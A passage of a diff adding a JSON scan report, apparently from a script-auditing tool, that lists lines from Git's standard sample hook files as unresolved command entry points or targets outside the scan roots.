+              "command": "$^O =~ 'cygwin') {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 166,
+              "evidence": "\t\t$working_dir = Win32::GetCwd();",
+              "evidenceTruncated": false,
+              "command": "$working_dir = Win32::GetCwd()"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 167,
+              "evidence": "\t\t$working_dir =~ tr/\\\\/\\//;",
+              "evidenceTruncated": false,
+              "command": "$working_dir =~ tr///////"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 168,
+              "evidence": "\t} else {",
+              "evidenceTruncated": false,
+              "command": "} else {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 169,
+              "evidence": "\t\trequire Cwd;",
+              "evidenceTruncated": false,
+              "command": "require Cwd"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 170,
+              "evidence": "\t\t$working_dir = Cwd::cwd();",
+              "evidenceTruncated": false,
+              "command": "$working_dir = Cwd::cwd()"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 171,
+              "evidence": "\t}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 173,
+              "evidence": "\treturn $working_dir;",
+              "evidenceTruncated": false,
+              "command": "return $working_dir"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 174,
+              "evidence": "}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\post-update.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 8,
+              "evidence": "exec git update-server-info",
+              "evidenceTruncated": false,
+              "command": "exec git update-server-info"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-applypatch.sample",
+              "reason": "Referenced script target is missing",
+              "line": 11,
+              "evidence": ". git-sh-setup",
+              "evidenceTruncated": false,
+              "reference": "git-sh-setup",
+              "target": "E:\\np-audit\\git-sh-setup",
+              "status": "missing"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-applypatch.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 12,
+              "evidence": "precommit=\"$(git rev-parse --git-path hooks/pre-commit)\"",
+              "evidenceTruncated": false,
+              "command": "rev-parse --git-path hooks/pre-commit)\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-applypatch.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 13,
+              "evidence": "test -x \"$precommit\" && exec \"$precommit\" ${1+\"$@\"}",
+              "evidenceTruncated": false,
+              "command": "test -x \"$precommit\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-applypatch.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 13,
+              "evidence": "test -x \"$precommit\" && exec \"$precommit\" ${1+\"$@\"}",
+              "evidenceTruncated": false,
+              "command": "exec \"$precommit\" ${1+\"$@\"}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-applypatch.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 14,
+              "evidence": ":",
+              "evidenceTruncated": false,
+              "command": ":"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 10,
+              "evidence": "if git rev-parse --verify HEAD >/dev/null 2>&1",
+              "evidenceTruncated": false,
+              "command": "if git rev-parse --verify HEAD >/dev/null 2>&1"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 11,
+              "evidence": "then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 12,
+              "evidence": "\tagainst=HEAD",
+              "evidenceTruncated": false,
+              "command": "against=HEAD"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 13,
+              "evidence": "else",
+              "evidenceTruncated": false,
+              "command": "else"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 15,
+              "evidence": "\tagainst=$(git hash-object -t tree /dev/null)",
+              "evidenceTruncated": false,
+              "command": "hash-object -t tree /dev/null)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 16,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 19,
+              "evidence": "allownonascii=$(git config --type=bool hooks.allownonascii)",
+              "evidenceTruncated": false,
+              "command": "config --type=bool hooks.allownonascii)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 22,
+              "evidence": "exec 1>&2",
+              "evidenceTruncated": false,
+              "command": "exec 1>&2"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 27,
+              "evidence": "if [ \"$allownonascii\" != \"true\" ] &&",
+              "evidenceTruncated": false,
+              "command": "if [ \"$allownonascii\" != \"true\" ]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 31,
+              "evidence": "\ttest $(git diff-index --cached --name-only --diff-filter=A -z $against |",
+              "evidenceTruncated": false,
+              "command": "test $(git diff-index --cached --name-only --diff-filter=A -z $against"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 32,
+              "evidence": "\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0",
+              "evidenceTruncated": false,
+              "command": "tr -d '[ -~]/0'"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 32,
+              "evidence": "\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0",
+              "evidenceTruncated": false,
+              "command": "wc -c) != 0"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 33,
+              "evidence": "then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 34,
+              "evidence": "\tcat <<\\EOF",
+              "evidenceTruncated": false,
+              "command": "cat <</EOF"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 35,
+              "evidence": "Error: Attempt to add a non-ASCII file name.",
+              "evidenceTruncated": false,
+              "command": "Error: Attempt to add a non-ASCII file name."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 37,
+              "evidence": "This can cause problems if you want to work with people on other platforms.",
+              "evidenceTruncated": false,
+              "command": "This can cause problems if you want to work with people on other platforms."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 39,
+              "evidence": "To be portable it is advisable to rename the file.",
+              "evidenceTruncated": false,
+              "command": "To be portable it is advisable to rename the file."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 41,
+              "evidence": "If you know what you are doing you can disable this check using:",
+              "evidenceTruncated": false,
+              "command": "If you know what you are doing you can disable this check using:"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 43,
+              "evidence": "  git config hooks.allownonascii true",
+              "evidenceTruncated": false,
+              "command": "git config hooks.allownonascii true"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 44,
+              "evidence": "EOF",
+              "evidenceTruncated": false,
+              "command": "EOF"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 46,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 49,
+              "evidence": "exec git diff-index --check --cached $against --",
+              "evidenceTruncated": false,
+              "command": "exec git diff-index --check --cached $against --"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-merge-commit.sample",
+              "reason": "Referenced script target is missing",
+              "line": 10,
+              "evidence": ". git-sh-setup",
+              "evidenceTruncated": false,
+              "reference": "git-sh-setup",
+              "target": "E:\\np-audit\\git-sh-setup",
+              "status": "missing"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-merge-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 11,
+              "evidence": "test -x \"$GIT_DIR/hooks/pre-commit\" &&",
+              "evidenceTruncated": false,
+              "command": "test -x \"$GIT_DIR/hooks/pre-commit\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-merge-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 12,
+              "evidence": "        exec \"$GIT_DIR/hooks/pre-commit\"",
+              "evidenceTruncated": false,
+              "command": "exec \"$GIT_DIR/hooks/pre-commit\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-merge-commit.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 13,
+              "evidence": ":",
+              "evidenceTruncated": false,
+              "command": ":"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 22,
+              "evidence": "remote=\"$1\"",
+              "evidenceTruncated": false,
+              "command": "remote=\"$1\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 23,
+              "evidence": "url=\"$2\"",
+              "evidenceTruncated": false,
+              "command": "url=\"$2\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 25,
+              "evidence": "zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')",
+              "evidenceTruncated": false,
+              "command": "hash-object --stdin </dev/null"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 25,
+              "evidence": "zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')",
+              "evidenceTruncated": false,
+              "command": "tr '[0-9a-f]' '0')"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 27,
+              "evidence": "while read local_ref local_oid remote_ref remote_oid",
+              "evidenceTruncated": false,
+              "command": "while read local_ref local_oid remote_ref remote_oid"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 28,
+              "evidence": "do",
+              "evidenceTruncated": false,
+              "command": "do"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 29,
+              "evidence": "\tif test \"$local_oid\" = \"$zero\"",
+              "evidenceTruncated": false,
+              "command": "if test \"$local_oid\" = \"$zero\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 30,
+              "evidence": "\tthen",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 32,
+              "evidence": "\t\t:",
+              "evidenceTruncated": false,
+              "command": ":"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 33,
+              "evidence": "\telse",
+              "evidenceTruncated": false,
+              "command": "else"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 34,
+              "evidence": "\t\tif test \"$remote_oid\" = \"$zero\"",
+              "evidenceTruncated": false,
+              "command": "if test \"$remote_oid\" = \"$zero\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 35,
+              "evidence": "\t\tthen",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 37,
+              "evidence": "\t\t\trange=\"$local_oid\"",
+              "evidenceTruncated": false,
+              "command": "range=\"$local_oid\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 38,
+              "evidence": "\t\telse",
+              "evidenceTruncated": false,
+              "command": "else"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 40,
+              "evidence": "\t\t\trange=\"$remote_oid..$local_oid\"",
+              "evidenceTruncated": false,
+              "command": "range=\"$remote_oid..$local_oid\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 41,
+              "evidence": "\t\tfi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 44,
+              "evidence": "\t\tcommit=$(git rev-list -n 1 --grep '^WIP' \"$range\")",
+              "evidenceTruncated": false,
+              "command": "rev-list -n 1 --grep '^WIP' \"$range\")"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 45,
+              "evidence": "\t\tif test -n \"$commit\"",
+              "evidenceTruncated": false,
+              "command": "if test -n \"$commit\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 46,
+              "evidence": "\t\tthen",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 49,
+              "evidence": "\t\tfi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 50,
+              "evidence": "\tfi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-push.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 51,
+              "evidence": "done",
+              "evidenceTruncated": false,
+              "command": "done"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 18,
+              "evidence": "publish=next",
+              "evidenceTruncated": false,
+              "command": "publish=next"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 19,
+              "evidence": "basebranch=\"$1\"",
+              "evidenceTruncated": false,
+              "command": "basebranch=\"$1\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 20,
+              "evidence": "if test \"$#\" = 2",
+              "evidenceTruncated": false,
+              "command": "if test \"$#\" = 2"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 21,
+              "evidence": "then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 22,
+              "evidence": "\ttopic=\"refs/heads/$2\"",
+              "evidenceTruncated": false,
+              "command": "topic=\"refs/heads/$2\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 23,
+              "evidence": "else",
+              "evidenceTruncated": false,
+              "command": "else"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 24,
+              "evidence": "\ttopic=`git symbolic-ref HEAD` ||",
+              "evidenceTruncated": false,
+              "command": "symbolic-ref HEAD`"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 25,
+              "evidence": "\texit 0 ;# we do not interrupt rebasing detached HEAD",
+              "evidenceTruncated": false,
+              "command": "# we do not interrupt rebasing detached HEAD"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 26,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 28,
+              "evidence": "case \"$topic\" in",
+              "evidenceTruncated": false,
+              "command": "case \"$topic\" in"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 29,
+              "evidence": "refs/heads/??/*)",
+              "evidenceTruncated": false,
+              "command": "refs/heads/??/*)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 31,
+              "evidence": "*)",
+              "evidenceTruncated": false,
+              "command": "*)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 32,
+              "evidence": "\texit 0 ;# we do not interrupt others.",
+              "evidenceTruncated": false,
+              "command": "# we do not interrupt others."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 34,
+              "evidence": "esac",
+              "evidenceTruncated": false,
+              "command": "esac"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 40,
+              "evidence": "git show-ref -q \"$topic\" || {",
+              "evidenceTruncated": false,
+              "command": "git show-ref -q \"$topic\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 40,
+              "evidence": "git show-ref -q \"$topic\" || {",
+              "evidenceTruncated": false,
+              "command": "{"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 43,
+              "evidence": "}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 46,
+              "evidence": "not_in_master=`git rev-list --pretty=oneline ^master \"$topic\"`",
+              "evidenceTruncated": false,
+              "command": "rev-list --pretty=oneline ^master \"$topic\"`"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 47,
+              "evidence": "if test -z \"$not_in_master\"",
+              "evidenceTruncated": false,
+              "command": "if test -z \"$not_in_master\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 48,
+              "evidence": "then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 50,
+              "evidence": "\texit 1 ;# we could allow it, but there is no point.",
+              "evidenceTruncated": false,
+              "command": "# we could allow it, but there is no point."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 51,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 54,
+              "evidence": "only_next_1=`git rev-list ^master \"^$topic\" ${publish} | sort`",
+              "evidenceTruncated": false,
+              "command": "rev-list ^master \"^$topic\" ${publish}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 54,
+              "evidence": "only_next_1=`git rev-list ^master \"^$topic\" ${publish} | sort`",
+              "evidenceTruncated": false,
+              "command": "sort`"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 55,
+              "evidence": "only_next_2=`git rev-list ^master           ${publish} | sort`",
+              "evidenceTruncated": false,
+              "command": "rev-list ^master           ${publish}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 55,
+              "evidence": "only_next_2=`git rev-list ^master           ${publish} | sort`",
+              "evidenceTruncated": false,
+              "command": "sort`"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 56,
+              "evidence": "if test \"$only_next_1\" = \"$only_next_2\"",
+              "evidenceTruncated": false,
+              "command": "if test \"$only_next_1\" = \"$only_next_2\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 57,
+              "evidence": "then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 58,
+              "evidence": "\tnot_in_topic=`git rev-list \"^$topic\" master`",
+              "evidenceTruncated": false,
+              "command": "rev-list \"^$topic\" master`"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 59,
+              "evidence": "\tif test -z \"$not_in_topic\"",
+              "evidenceTruncated": false,
+              "command": "if test -z \"$not_in_topic\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 60,
+              "evidence": "\tthen",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 62,
+              "evidence": "\t\texit 1 ;# we could allow it, but there is no point.",
+              "evidenceTruncated": false,
+              "command": "# we could allow it, but there is no point."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 63,
+              "evidence": "\telse",
+              "evidenceTruncated": false,
+              "command": "else"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 65,
+              "evidence": "\tfi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 66,
+              "evidence": "else",
+              "evidenceTruncated": false,
+              "command": "else"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 67,
+              "evidence": "\tnot_in_next=`git rev-list --pretty=oneline ^${publish} \"$topic\"`",
+              "evidenceTruncated": false,
+              "command": "rev-list --pretty=oneline ^${publish} \"$topic\"`"
+            },
+            {
+              "path": "E:\\usr\\bin\\perl",
+              "reason": "Outside supplied scan roots"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Script target could not be inspected",
+              "line": 68,
+              "evidence": "\t/usr/bin/perl -e '",
+              "evidenceTruncated": false,
+              "reference": "/usr/bin/perl",
+              "target": "E:\\usr\\bin\\perl",
+              "status": "unresolved"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 69,
+              "evidence": "\t\tmy $topic = $ARGV[0];",
+              "evidenceTruncated": false,
+              "command": "my $topic = $ARGV[0]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 70,
+              "evidence": "\t\tmy $msg = \"* $topic has commits already merged to public branch:\\n\";",
+              "evidenceTruncated": false,
+              "command": "my $msg = \"* $topic has commits already merged to public branch:/n\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 71,
+              "evidence": "\t\tmy (%not_in_next) = map {",
+              "evidenceTruncated": false,
+              "command": "my (%not_in_next) = map {"
+            },
+            {
+              "path": "E:\\^([0-9a-f]+)",
+              "reason": "Outside supplied scan roots"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Script target could not be inspected",
+              "line": 72,
+              "evidence": "\t\t\t/^([0-9a-f]+) /;",
+              "evidenceTruncated": false,
+              "reference": "/^([0-9a-f]+)",
+              "target": "E:\\^([0-9a-f]+)",
+              "status": "unresolved"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 73,
+              "evidence": "\t\t\t($1 => 1);",
+              "evidenceTruncated": false,
+              "command": "($1 => 1)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 74,
+              "evidence": "\t\t} split(/\\n/, $ARGV[1]);",
+              "evidenceTruncated": false,
+              "command": "} split(//n/, $ARGV[1])"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 75,
+              "evidence": "\t\tfor my $elem (map {",
+              "evidenceTruncated": false,
+              "command": "for my $elem (map {"
+            },
+            {
+              "path": "E:\\^([0-9a-f]+)",
+              "reason": "Outside supplied scan roots"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Script target could not be inspected",
+              "line": 76,
+              "evidence": "\t\t\t\t/^([0-9a-f]+) (.*)$/;",
+              "evidenceTruncated": false,
+              "reference": "/^([0-9a-f]+)",
+              "target": "E:\\^([0-9a-f]+)",
+              "status": "unresolved"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 77,
+              "evidence": "\t\t\t\t[$1 => $2];",
+              "evidenceTruncated": false,
+              "command": "[$1 => $2]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 78,
+              "evidence": "\t\t\t} split(/\\n/, $ARGV[2])) {",
+              "evidenceTruncated": false,
+              "command": "} split(//n/, $ARGV[2])) {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 79,
+              "evidence": "\t\t\tif (!exists $not_in_next{$elem->[0]}) {",
+              "evidenceTruncated": false,
+              "command": "if (!exists $not_in_next{$elem->[0]}) {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 80,
+              "evidence": "\t\t\t\tif ($msg) {",
+              "evidenceTruncated": false,
+              "command": "if ($msg) {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 81,
